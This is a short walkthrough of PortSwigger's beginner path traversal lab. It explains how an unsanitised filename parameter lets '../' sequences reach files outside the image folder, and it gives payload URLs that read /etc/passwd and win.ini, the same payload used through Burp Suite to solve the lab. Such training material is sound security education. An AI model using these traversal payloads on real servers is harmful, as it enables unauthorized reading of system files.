## Welcome, my friend. Today we will start the [1. Path traversal lab](https://portswigger.net/web-security/file-path-traversal/lab-simple) in ```portswigger```

# Explain this Scenario:


### Let's take the example of a shopping app that displays images of items for sale. It might display an image with HTML similar to this:

```
<img src="/loadImage?filename=218.png">
```


#### In this example, the ```loadImage``` link has a filename ```parameter``` and returns the contents of the specified file. Image files are stored on disk at ```/var/www/images/```. The application reads from the following path:


```
/var/www/images/218.png
```

## Attack via Path Traversal

#### If the application does not include any defenses against Path Traversal attacks, an attacker could request a link like this:

```
https://insecure-website.com/loadImage?filename=../../../etc/passwd
```

#### This link causes the application to read from the following path:

```
/var/www/images/../../../etc/passwd
```

### On Windows systems

On Windows systems, both ```../``` and ```..\``` can be used as directory sequences. An example of a similar attack on a Windows-based server might be:

```
https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini
```

#### This link causes the path to read:

```
C:\windows\win.ini
```

# Let'a play this lab:

#### First, we navigate inside the browser and search for all the existing parameters that we can benefit from, such as:

####We found ```productId``` prameter

#### but it is not vulnerable. :(

### We use the ```burp suite``` tool to help us intercept the request and modify it.

### Well, we have found ```filename``` parameter that may be affected by a vulnerability


##### The value of filename is ```48.jpg``` we will instead to ```../../../etc/passwd```

### Great, we were able to access that sensitive file
